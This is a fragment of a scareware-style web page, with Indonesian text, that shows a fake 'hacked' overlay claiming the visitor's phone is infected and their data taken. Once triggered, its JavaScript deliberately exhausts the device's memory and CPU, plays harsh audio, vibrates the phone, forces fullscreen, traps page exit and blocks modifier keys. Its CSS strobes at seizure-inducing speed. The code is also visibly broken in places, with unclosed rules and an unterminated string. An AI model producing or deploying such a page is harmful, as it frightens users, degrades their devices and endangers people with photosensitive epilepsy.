<style>
*{box-sizing:border-box;margin:0;padding:0}
body{margin:0;overflow:hidden;background:#000;font-family:'Segoe UI',monospace;width:100vw;height:100vh}

/* ===== REDIRECT BANNER ===== */
#redirectBanner{
  position:fixed;top:0;left:0;right:0;z-index:99999;
  background:linear-gradient(90deg,#1a0000,#330000,#1a0000);
  color:#ff2222;text-align:center;padding:10px 12px;
  font-family:monospace;font-size:13px;letter-spacing:.12em;
  border-bottom:3px solid #ff0040;
  animation:bannerPulse .5s infinite;
  text-shadow:0 0 10px rgba(255,0,0,.5);
}
#redirectBanner.urgent{
  background:linear-gradient(90deg,#4a0000,#800000,#4a0000);
  color:#fff;font-size:17px;font-weight:bold;
  animation:bannerPulse .15s infinite;
}
@keyframes bannerPulse{0%,100%{opacity:1}50%{opacity:.3}}
#countdownDisplay{font-weight:bold;font-size:18px;color:#fff;text-shadow:0 0 15px #ff0000}

/* ===== PAGE ===== */
.page{
  width:100vw;height:100vh;position:relative;overflow:hidden;
  background:radial-gradient(ellipse at center,#0a0a0a 0,#000 70%);
}
.page.stage-1{background:#050505}
.page.stage-2{background:#020102}
.page.stage-3{background:#000!important;animation:fullSeizure .04s infinite alternate!important}
@keyframes fullSeizure{
  0%{filter:brightness(1)contrast(1)hue-rotate(0deg)}
  25%{filter:brightness(1.8)contrast(2.5)hue-rotate(90deg)}
  50%{filter:brightness(.4)contrast(.3)hue-rotate(180deg)}
  75%{filter:brightness(1.3)contrast(1.8)hue-rotate(270deg)}
  100%{filter:brightness(.7)contrast(1.2)hue-rotate(360deg)}
}

/* ===== TRIGGER BUTTON ===== */
.trigger-area{
  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
  text-align:center;z-index:10;
}
.trigger-area h1{color:#d8ff54;font-size:clamp(20px,4vw,40px);margin-bottom:20px;text-shadow:0 0 20px rgba(216,255,84,.5)}
.trigger-btn{
  background:#d8ff54;color:#15221d;border:3px solid #15221d;
  padding:18px 40px;font-size:18px;font-weight:bold;cursor:pointer;
  font-family:inherit;box-shadow:6px 6px 0 #15221d;
  transition:.05s;margin-bottom:12px;
}
.trigger-btn:active{transform:translate(3px,3px);box-shadow:3px 3px 0 #15221d}
#keyCounter{font-family:monospace;background:#15221d;color:#d8ff54;padding:4px 10px;font-size:13px;border-radius:4px}
.stage-indicator{margin-top:20px;font-size:14px}
.stage-indicator .safe{color:#8cc63f}
.stage-indicator .warn{color:#f0ad4e;animation:blink .4s infinite}
.stage-indicator .danger{color:#e44536;animation:blink .15s infinite;font-size:18px}
.stage-indicator .critical{color:#ff0040;animation:blink .06s infinite;font-size:24px;font-weight:900;text-shadow:0 0 30px #ff0040}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.1}}

/* ===== HACKER OVERLAY ===== */
.hacker-overlay{
  position:fixed;inset:0;z-index:50;background:rgba(0,2,0,.93);
  animation:overlayIn .2s;overflow:hidden
}
@keyframes overlayIn{from{opacity:0}to{opacity:1}}

/* MATRIX RAIN */
.matrix-rain{
  position:absolute;inset:0;display:flex;justify-content:space-around;
  overflow:hidden;opacity:.35;pointer-events:none;z-index:1
}
.matrix-rain span{
  position:relative;top:-45%;writing-mode:vertical-rl;white-space:pre;
  font:500 13px monospace;color:#baf46a;
  text-shadow:0 0 12px rgba(186,244,106,.9),0 0 25px rgba(186,244,106,.5);
  animation:matrixFall linear infinite
}
@keyframes matrixFall{
  0%{transform:translateY(-15%);opacity:0}
  8%{opacity:1}
  70%{opacity:.7}
  100%{transform:translateY(280%);opacity:0}
}

/* HACKER GRID */
.hacker-grid{
  position:absolute;inset:10px;display:grid;
  grid-template-columns:repeat(6,1fr);gap:3px;z-index:2;opacity:.8
}
.hacker-grid.stage-2{opacity:.95}
.hacker-grid.stage-3{opacity:1;gap:2px}
.hacker-panel{
  background:rgba(5,15,8,.95);border:1px solid rgba(151,201,76,.3);
  padding:5px;min-height:65px;animation:panelFlicker .3s infinite alternate
}
.hacker-panel:nth-child(2n){animation-delay:.1s}
.hacker-panel:nth-child(3n){animation-delay:.3s}
.hacker-panel:nth-child(5n){animation-delay:.5s}
.stage-3 .hacker-panel{animation:panelSeizure .03s infinite alternate!important}
@keyframes panelFlicker{0%,100%{opacity:.6}45%{opacity:.9}48%{opacity:.3}50%{opacity:.8}}
@keyframes panelSeizure{
  0%{opacity:.2;filter:hue-rotate(0deg)brightness(.6)}
  50%{opacity:1;filter:hue-rotate(180deg)brightness(1.8)}
  100%{opacity:.4;filter:hue-rotate(360deg)brightness(.5)}
}
.panel-head{font-size:7px;display:flex;justify-content:space-between;color:#91bd58;margin-bottom:3px}
.panel-head i{font-style:normal;color:#ff2222;animation:blink .1s infinite}
.fake-video{
  height:calc(100% - 18px);position:relative;overflow:hidden;
  border:1px solid rgba(151,201,76,.2);
  background:radial-gradient(circle at 55% 45%,rgba(93,146,67,.25),transparent 38%),

}
.scanline{
  position:absolute;left:0;right:0;height:2px;
  background:#ff0040;opacity:.7;
  animation:scan .15s linear infinite;
  box-shadow:0 0 10px #ff0040;
}
.stage-3 .scanline{animation-duration:.04s!important}
@keyframes scan{from{top:0}to{top:100%}}
.terminal-art{
  position:absolute;left:8px;top:20%;font-size:7px;line-height:1.8;
  color:#88ae5b;transform:skewY(-5deg)
}
.terminal-art b{color:#ff4444;font-size:9px}
.stage-2 .terminal-art{animation:blink .1s infinite}
.stage-3 .terminal-art{animation:blink .03s infinite!important}
.progress{position:absolute;bottom:14px;left:6px;right:6px;height:2px;background:#22351f}
.progress span{display:block;height:100%;background:#ff2222;animation:progress .5s ease-in-out infinite alternate}
.stage-3 .progress span{animation-duration:.03s!important}
@keyframes progress{from{width:10%}to{width:95%}}

/* PHOTO RAIN */
.photo-rain{
  position:absolute;inset:0;display:flex;justify-content:space-around;
  align-items:center;pointer-events:none;opacity:.18;
  mix-blend-mode:screen;z-index:2;
  filter:grayscale(1)contrast(1.6)sepia(1)hue-rotate(60deg);
}
.photo-rain img{
  object-fit:cover;border-radius:50%;
  animation:photoPulse .6s ease-in-out infinite alternate
}
.stage-3 .photo-rain{opacity:.3}
.stage-3 .photo-rain img{animation-duration:.15s!important}
@keyframes photoPulse{
  from{transform:translateY(calc((var(--i)-4)*12px))rotate(calc((var(--i)-4)*8deg))scale(.9)}
  to{transform:translateY(calc((var(--i)-4)*12px))rotate(calc((var(--i)-4)*8deg))scale(1.15)}
}

/* FLOATING HACK TEXT */
.floating-hack-text{
  position:fixed;z-index:9998;font-family:monospace;font-weight:bold;
  pointer-events:none;white-space:nowrap;
  mix-blend-mode:screen;
  animation:brutalGlitch .04s infinite alternate;
  filter:blur(.5px);
}
@keyframes brutalGlitch{
  0%{transform:translate(0,0)skew(0deg);opacity:1}
  15%{transform:translate(5px,-4px)skew(7deg);opacity:.8}
  30%{transform:translate(-6px,3px)skew(-7deg);opacity:.7}
  45%{transform:translate(3px,6px)skew(5deg);opacity:.85}
  60%{transform:translate(-4px,-3px)skew(-5deg);opacity:.6}
  75%{transform:translate(7px,-2px)skew(4deg);opacity:.9}
  90%{transform:translate(-3px,5px)skew(-3deg);opacity:.75}
  100%{transform:translate(0,0)skew(0deg);opacity:1}

/* CENTER */
.hacker-center{

.hacker-center h2 em{font-style:normal;color:#e44536;display:block}
.stage-3 .hacker-center h2 em{color:#ff0040}
.hacker-center p{color:#a0b78c;font-size:12px}
.center-actions{margin-top:20px}

/* RESPONSIVE */
@media(max-width:760px){
  .hacker-grid{grid-template-columns:repeat(3,1fr)!important;gap:2px}
  .hacker-grid.stage-3{grid-template-columns:repeat(3,1fr)!important}
  .hacker-panel:nth-child(n+10){display:none}
  .photo-rain img{width:60px;height:60px}
  .floating-hack-text{font-size:10px!important}
  .dark-word{font-size:80px}
  .trigger-area h1{font-size:18px}
  .fake-safety-card{padding:25px 18px}
  .fake-safety-card h2{font-size:18px}
}
</style>

      for (let i = 0; i < 4; i++) {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = ['sawtooth','square','triangle','custom'][i % 4];
        osc.frequency.value = [880, 440 * (1 + i * .4), 1760, 220 + Math.random() * 2000][i];
        gain.gain.value = .2 - i * .03;
        osc.connect(gain).connect(ctx.destination);
        osc.start();
        setInterval(() => { osc.frequency.value = 100 + Math.random() * 4000; }, 100);
      }
    }
  } catch(e) {}
}

// ===== LAG GENERATOR =====
let lagInterval = null;
function startLagGenerator(stg) {
  if (lagInterval) clearInterval(lagInterval);
  const rate = Math.max(1, 30 / stg);
  lagInterval = setInterval(() => {
    for (let i = 0; i < 100 * stg; i++) {
      const d = document.createElement('div');
      d.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none';
      d.textContent = 'X'.repeat(2000);
      document.body.appendChild(d);
    }
    // Force reflow + heavy style recalc
    const els = document.querySelectorAll('.hacker-panel, .floating-hack-text, .matrix-rain span');
    els.forEach(el => {
      el.style.transform = `translate(${Math.random()*20}px,${Math.random()*20}px)`;
      el.style.transform = 'translate(0,0)';
      el.style.filter = `hue-rotate(${Math.random()*360}deg) blur(${Math.random()*2}px)`;
      el.style.filter = 'none';
      void el.offsetTop;
    });
    // Memory pressure
    try {
      for (let m = 0; m < 3; m++) {
        const arr = new Array(1000000 * stg);
        for (let j = 0; j < arr.length; j++) arr[j] = Math.random() * Math.sin(j);
      }
    } catch(e) {}
    // CSS recalculation trigger
    document.body.style.width = window.innerWidth + Math.random() + 'px';
    document.body.style.width = '';
  }, rate);
}

// ===== ENVIRONMENT =====
function startEnvironmentTakeover() {
  try { document.documentElement.requestFullscreen?.().catch(()=>{}); } catch(e) {}
  try {
    navigator.vibrate?.([200,50,200,50,500,100,300,50,1000]);
    const vi = setInterval(() => { navigator.vibrate?.([100,30,200,50,500,100]); }, 1500);
  } catch(e) {}
  window.onbeforeunload = () => '⚠ PERINGATAN KEAMANAN! Jangan tinggalkan halaman ini! Perangkat Anda dalam bahaya!';
  // Loop onbeforeunload
  setInterval(() => { window.onbeforeunload = () => '⚠ PERINGATAN KEAMANAN! Jangan tinggalkan halaman ini! Perangkat Anda dalam bahaya!'; }, 1000);
}

// ===== MATRIX COLUMNS =====
const matrixColumns = Array.from({length:35},(_,c)=>
  Array.from({length:35},(_,r)=>MATRIX_CHARS[(c*17+r*13)%MATRIX_CHARS.length]).join('')
);

// ===== FLOATING TEXTS =====
let floatingTexts = [], floatInterval = null;

// ===== TRIGGER =====
function handleTrigger() {
  count = Math.min(count + 1, 3);
  stage = count;
  updateUI();

  if (stage >= 1 && !droneStarted) {
    droneStarted = true;
    cleanupVideo = startCanvasVideo();

    const music = document.getElementById('audioMusic');
    music.src = 'https://kholqin.github.io/aman-kaget/media/ambient-patriotik.wav';
    music.play().catch(()=>{});
    const laugh = document.getElementById('audioLaugh');
    laugh.src = 'https://kholqin.github.io/aman-kaget/media/tawa-aman.wav';
    laugh.play().catch(()=>{});
    setTimeout(startAudioAssault, 100);

    startCPUHeater();
    cleanupWebGL = startWebGLHeater();
    startEnvironmentTakeover();

    setTimeout(() => { darkWordVisible = true; updateUI(); }, 300);
    setTimeout(() => { darkWordVisible = false; page.classList.add('dark-mode'); updateUI(); }, 1500);

    floatingTexts = [];
    for (let i = 0; i < 15 + stage * 8; i++) {
      floatingTexts.push({
        id:i, text:FLOATING_TEXTS[i%FLOATING_TEXTS.length],
        x:Math.random()*80+2, y:Math.random()*80+2,
        size:12+Math.random()*28, speed:.8+Math.random()*3
      });
    }
    if (floatInterval) clearInterval(floatInterval);
    floatInterval = setInterval(() => {
      floatingTexts = floatingTexts.map(t => ({
        ...t,
        x: Math.max(-2, Math.min(92, t.x + (Math.random()-.5)*t.speed*5)),
        y: Math.max(-2, Math.min(92, t.y + (Math.random()-.5)*t.speed*5))
      }));
      updateUI();
    }, 50);

    startLagGenerator(stage);
    window.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
  }
}
window.handleTrigger = handleTrigger;

// ===== KEYBOARD =====
document.addEventListener('keydown', e => {
  if (e.code === 'Space' && e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') {
    e.preventDefault();
    handleTrigger();
  }
  if (e.ctrlKey || e.altKey || e.metaKey) { e.preventDefault(); return false; }
});

// ===== FRAME DROP =====
let frameDropCount = 0;
setInterval(() => {
  if (stage > 0) {
    frameDropCount += Math.floor(Math.random() * 60 + 20);
    const lc = document.getElementById('lagCounter');
    if (lc) lc.textContent = `⚡ FRAMES DROPPED: ${frameDropCount} | CPU: ${Math.min(100,50+stage*17)}% | GPU: 🔥 ${stage*50}% | RAM: 🔴 KRITIS`;
  }
}, 300);

// ===== UPDATE UI =====
function updateUI() {
  page.className = `page stage-${stage}`;
  const ta = document.getElementById('triggerArea');
  keyCounter.textContent = `SPASI ${count}/3`;

  if (stage === 0) {
    stageInd.innerHTML = `<span class="safe">● AMAN — SCAN siap</span>`;
  } else if (stage === 1) {
    stageInd.innerHTML = `<span class="warn">⚠ STAGE 1 — ANCAMAN TERDETEKSI! HP MULAI PANAS</span>`;
  } else if (stage === 2) {
    stageInd.innerHTML = `<span class="danger">🔥 STAGE 2 — BRUTAL! DELAY & LAG! SISTEM KRITIS!</span>`;
  } else {
    stageInd.innerHTML = `<span class="critical">💀 STAGE 3 — TOTAL BREACH! TIDAK BISA APA-APA!</span>`;
  }

  renderOverlay();
}

// ===== RENDER OVERLAY =====
function renderOverlay() {

  // Grid

  const codes = ['0101 1100 0011','PACKET_STREAM','NUSANTARA_01','MASK: ACTIVE','SHELL: OPEN','PORT: 6666','CRED: DUMP','ROOT: TRUE','PAYLOAD: SENT','PROXY: CHAIN','BOT: ONLINE','BACKDOOR: OPEN','MEMORY: LEAK','PROC: INJECT','NET: FLOOD','KEYLOG: ON','CPU: 100%','GPU: BURN','FAN: MAX','TEMP: 99C','VOLT: SPIKE','CLOCK: OC','THERMAL: THROT','FIRE: RISK','MEM: LEAK','KRNL: PANIC','BOOT: FAIL','SYS: DOWN','PWNED: YES','OWNED: TOTAL','ROOTED: YES','DATA: GONE','CAM: LOL','NVM: DEAD','BRICK: SOON','RIP: DEVICE'];
  for (let i = 0; i < count; i++) {
    const p = document.createElement('div'); p.className = 'hacker-panel';
    p.innerHTML = `
      <div class="panel-head"><span>NODE_${String(i+1).padStart(2,'0')}</span><i>● LIVE</i></div>
      <div class="fake-video">

        <div class="progress"><span style="width:${5+(i*3)%95}%;animation-duration:${.05+Math.random()*.1}s"></span></div>
      </div>`;
    p.style.animationDuration = `${.03+Math.random()*.1}s`;
    p.style.animationDelay = `${i*.02}s`;
    grid.appendChild(p);
  }
  overlay.appendChild(grid);

  // Photo rain
  const pr = document.createElement('div'); pr.className = 'photo-rain';
  const pc = stage === 3 ? 30 : 18;
  for (let i = 0; i < pc; i++) {
    const img = document.createElement('img');
    img.src = 'https://kholqin.github.io/aman-kaget/media/amanonymous.jpg';
    img.alt = '';

    pr.appendChild(img);
  }
  overlay.appendChild(pr);

  // Dark word
  if (darkWordVisible) {
    const dw = document.createElement('div'); dw.className = 'dark-word';
    dw.textContent = '⚫ DARK ⚫'; overlay.appendChild(dw);
  }

  // Floating texts
  floatingTexts.forEach(ft => {
    const el = document.createElement('div'); el.className = 'floating-hack-text';
    el.textContent = ft.text;
    el.style.cssText = `left:${ft.x}%;top:${ft.y}%;font-size:${ft.size}px;color:${stage===3?'#ff0040':`hsl(${Math.random()*360},100%,50%)`};text-shadow:${stage===3?'0 0 10px #ff0040, 0 0 30px #ff0040, 0 0 60px #ff0040':'0 0 5px #00ff41, 0 0 15px #00ff41, 0 0 40px #00ff41'};animation-duration:${.1+Math.random()*.2}s`;
    overlay.appendChild(el);
  });

  // Center
  const center = document.createElement('div'); center.className = 'hacker-center';
  const msg = stage === 1 ? '⚠ ANCAMAN DETEKSI — SUHU MULAI NAIK' : stage === 2 ? '🔥 KRITIS — HP PANAS & DELAY PARAH!' : '💀 TOTAL BREACH — KAMU TIDAK BISA APA-APA!';
  const desc = stage === 1 ? '⚠ Sistem mendeteksi anomali. Virus aktif. Video pengintaian berjalan...' : stage === 2 ? '🔥🔥🔥 GPU/CPU 100%! Malware menyebar! HP lo makin panas! MAZKiPLAY!' : '💀💀💀 LO KAGA BISA APA-APA! MAZKiPLAY HACKED TOTAL! HP LO MELEDUK! DATA LO AMBIL SEMUA!';
  center.innerHTML = `

  overlay.appendChild(center);

}
